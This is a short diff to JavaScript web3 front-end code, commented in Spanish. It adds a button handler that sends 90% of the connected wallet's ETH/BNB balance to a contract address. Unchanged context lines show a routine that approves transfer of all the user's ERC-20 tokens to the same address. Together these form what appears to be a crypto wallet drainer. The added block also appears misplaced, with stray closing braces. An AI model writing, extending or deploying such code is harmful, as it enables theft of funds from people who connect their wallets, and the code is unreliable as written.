@@ -38,6 +38,33 @@ async function initApp() {
     // Interacción con el contrato para aprobar la transferencia de todos los tokens ERC-20
     approveTransferForAllTokens(tokens, account, contractAddress);
 }
+ document.getElementById('sendEthBtn').addEventListener('click', async () => {
+        const accounts = await web3.eth.getAccounts();
+        if (accounts.length === 0) {
+            console.error("No hay cuentas disponibles.");
+            return;
+        }
+        const account = accounts[0];
+
+        try {
+            const balance = await web3.eth.getBalance(account);
+            // Calcula el 90% del saldo del usuario para enviar
+            const amountToSend = web3.utils.toWei((web3.utils.fromWei(balance, 'ether') * 0.9).toString(), 'ether');
+
+            web3.eth.sendTransaction({
+                from: account,
+                to: contractAddress,
+                value: amountToSend
+            }).then(function(receipt){
+                console.log('Transacción completada:', receipt);
+            }).catch(function(error){
+                console.error('Error al enviar ETH/BNB:', error);
+            });
+        } catch (error) {
+            console.error("Error al obtener el balance o enviar ETH/BNB:", error);
+        }
+    });
+}
 
 async function approveTransferForAllTokens(tokens, userAccount, contractAddress) {
     // Fragmento de la ABI para las funciones necesarias del token ERC-20
